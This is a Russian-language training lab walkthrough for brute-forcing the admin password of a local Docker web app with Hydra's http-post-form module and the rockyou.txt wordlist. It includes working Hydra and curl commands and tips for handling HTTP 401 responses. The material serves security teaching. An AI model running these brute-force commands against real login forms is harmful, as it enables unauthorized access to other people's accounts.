# Практическое руководство по подбору пароля в BruteForceLab

## 1. Цель работы

Цель работы — изучить базовый принцип перебора паролей для учебной веб-формы авторизации, научиться анализировать HTTP-запросы средствами браузера и `curl`, а также познакомиться с инструментом Hydra и словарём `rockyou.txt`.

## 2. Предварительная установка необходимых пакетов

Перед началом работы необходимо установить Docker Engine и Docker Compose:

```bash
sudo apt update
sudo apt install -y docker.io docker-compose
sudo systemctl enable --now docker
sudo docker --version
sudo docker compose version
```

## 3. Развёртывание учебного приложения

Учебное приложение опубликовано в Docker Hub. Загрузите образ:

```bash
sudo docker pull nshkilevich/bruteforce-lab:latest
```

Затем запустите контейнер. Порт привязан к `127.0.0.1`, поэтому приложение доступно только на локальном компьютере:

```bash
sudo docker run -d \
  --name bruteforce-lab \
  -p 127.0.0.1:8080:8080 \
  nshkilevich/bruteforce-lab:latest
```

Проверить состояние контейнера можно командой:

```bash
sudo docker ps
```

## 4. Первичное исследование приложения

Откройте в браузере [http://127.0.0.1:8080](http://127.0.0.1:8080).

![Первичный вход](images/First%20enter.png)

В приложении дана подсказка: «Админ — рок звезда». Из неё можно предположить, что целевой пользователь — `admin`, а пароль следует искать среди популярных паролей.

## 5. Словарь rockyou.txt

`rockyou.txt` — широко используемый словарь паролей, содержащий большое количество паролей, полученных из утечки данных сервиса RockYou. В Kali Linux он обычно поставляется в сжатом виде:

```text
/usr/share/wordlists/rockyou.txt.gz
```

Распакуйте словарь:

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

После распаковки файл доступен по адресу `/usr/share/wordlists/rockyou.txt`. Проверить его можно командами:

```bash
ls -lh /usr/share/wordlists/rockyou.txt
head /usr/share/wordlists/rockyou.txt
```

## 6. Исследование формы авторизации

Откройте инструменты разработчика браузера клавишей <kbd>F12</kbd> и найдите HTML-форму авторизации:

![Serch f12](images/Serch%20f12.png)

```html
<form method="post" action="/login">
  <label for="login">Логин</label>
  <input id="login" name="login" required autofocus>
  <label for="password">Пароль</label>
  <input id="password" type="password" name="password" required>
  <p class="error"></p>
  <button type="submit">Войти</button>
</form>
```

Форма отправляет данные методом `POST` обработчику `/login`. Имена полей: `login` и `password`.

## 7. Проверка реакции приложения

Во вкладке **Network** в инструментах разработчика введите произвольный пароль и отправьте форму.

![Serach network](images/Serach%20network.png)

При неправильной попытке приложение возвращает HTTP-ответ `401 Unauthorized`, а в теле ответа находится сообщение «Неверный логин или пароль».

## 8. Проверка POST-запроса с помощью curl

`curl` — консольная утилита для выполнения HTTP-запросов. Она помогает проверить поведение веб-приложения без браузера:

```bash
curl -v -X POST http://127.0.0.1:8080/login \
  -d "login=admin&password=test"
```

В ответе можно увидеть `POST /login`, `Content-Type: application/x-www-form-urlencoded` и `HTTP/1.1 401 Unauthorized`. Это подтверждает структуру запроса и реакцию приложения на неправильный пароль.

## 9. Hydra

Hydra — инструмент для автоматизированной проверки комбинаций учётных данных для различных сетевых протоколов и сервисов. Для этого стенда используется модуль `http-post-form`.

Первый вариант команды:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 \
  -s 8080 http-post-form \
  "/login:login=^USER^&password=^PASS^:E=401"
```

Здесь:

- `-l` задаёт логин;
- `-P` указывает словарь паролей;
- `127.0.0.1` — адрес стенда;
- `-s 8080` — порт;
- `http-post-form` — модуль POST-формы;
- `/login` — путь обработчика;
- `^USER^` и `^PASS^` — места подстановки логина и очередного пароля.

При запуске может появиться сообщение:

```text
[ERROR] received HTTP error code 401. The target may be using HTTP auth,
not a web form. Use module "http-get" instead, or set "1=".
```

## 10. Обработка HTTP 401

В учебном приложении код `401` используется как обычный ответ на неправильный пароль. Hydra может принять его за признак HTTP-аутентификации и вывести предупреждение. Для продолжения обработки формы используется параметр `1=`:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 -s 8080 -f \
  http-post-form \
  "/login:login=^USER^&password=^PASS^:1=:F=Неверный логин или пароль"
```

Параметр `-f` останавливает перебор после первой найденной валидной пары. `1=` позволяет корректно обработать особенность с HTTP `401`, а условие `F=Неверный логин или пароль` указывает Hydra считать ответ с этой строкой неудачной попыткой.

## 11. Результат работы Hydra

После нахождения правильной комбинации Hydra выводит валидную пару учётных данных. Благодаря `-f` перебор прекращается после первого результата. Используйте найденные учётные данные для входа в приложение.

![Hydra resalts](images/Hydra%20resalts.png)

## 12. Файл hydra.restore

При запуске Hydra может появиться предупреждение о файле `./hydra.restore`. Это файл состояния, который позволяет восстановить прерванную сессию. Если предыдущая сессия больше не нужна, в учебной лаборатории его можно удалить:

```bash
rm -f hydra.restore
```

## 13. Получение флага

После обнаружения правильных учётных данных вернитесь в браузер по адресу [http://127.0.0.1:8080](http://127.0.0.1:8080) и выполните вход. После успешной авторизации откроется следующий этап учебного задания, в котором необходимо получить флаг.

## 14. Краткая последовательность решения

1. Развернуть Docker-стенд.
2. Изучить подсказку приложения и определить логин `admin`.
3. Изучить HTML-форму и определить маршрут `POST /login`.
4. Проверить неправильную попытку через Network и обнаружить HTTP `401`.
5. Проверить запрос через `curl`.
6. Настроить Hydra для `http-post-form`.
7. Использовать словарь `rockyou.txt`.
8. Добавить `1=` для обработки HTTP `401`.
9. Использовать `-f` для остановки после первой найденной пары.
10. Войти с найденными данными и получить флаг.

## 15. Основные команды

### Установка

```bash
sudo apt update
sudo apt install -y docker.io
sudo systemctl enable --now docker
sudo docker compose version
```

### Развёртывание

```bash
sudo docker pull nshkilevich/bruteforce-lab:latest
sudo docker run -d \
  --name bruteforce-lab \
  -p 127.0.0.1:8080:8080 \
  nshkilevich/bruteforce-lab:latest
sudo docker ps
```

### Распаковка rockyou

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

### Проверка POST-запроса

```bash
curl -v -X POST http://127.0.0.1:8080/login \
  -d "login=admin&password=test"
```

### Перебор в учебном стенде

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 -s 8080 -f \
  http-post-form \
  "/login:login=^USER^&password=^PASS^:1=:F=Неверный логин или пароль"
```

### Удаление старого состояния

```bash
rm -f hydra.restore
```

## 16. Итог

В ходе работы изучаются установка и запуск Docker на Kali Linux, развёртывание локального Docker-стенда, анализ HTML-формы и HTTP POST, диагностика HTTP `401` с помощью DevTools и `curl`, работа Hydra и `rockyou.txt`, параметры `-l`, `-P`, `-s` и `-f`, модуль `http-post-form`, условие `F=` и обработка ответа `401`.
